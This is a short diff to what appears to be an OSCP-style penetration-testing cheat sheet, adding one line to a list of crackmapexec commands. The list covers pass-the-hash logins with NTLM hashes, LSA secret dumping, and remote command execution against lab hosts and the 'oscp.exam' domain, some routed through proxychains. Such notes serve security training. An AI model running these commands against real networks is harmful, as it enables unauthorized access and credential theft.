@@ -3901,6 +3901,7 @@ proxychains crackmapexec mssql -d oscp.exam -u sql_svc -p Dolphin1  -x "whoami" 
 crackmapexec smb 10.11.1.120-124 -u administrator -H 'LMHASH:NTHASH' --local-auth --lsa #for hashes
 crackmapexec smb 10.11.1.20-24 -u pete -H b566afa0a7e41755a286cba1a7a3012d --exec-method smbexec -X 'whoami'
 crackmapexec smb 10.11.1.20-24 -u tris -H 08df3c73ded940e1f2bcf5eea4b8dbf6 -d svcorp.com -x whoami
+proxychains crackmapexec smb 10.10.126.146 -u 'Administrator' -H '59b280ba707d22e3ef0aa587fc29ffe5' -x whoami -d oscp.exam
 ````
 ##### TGT Impersonation
 ````
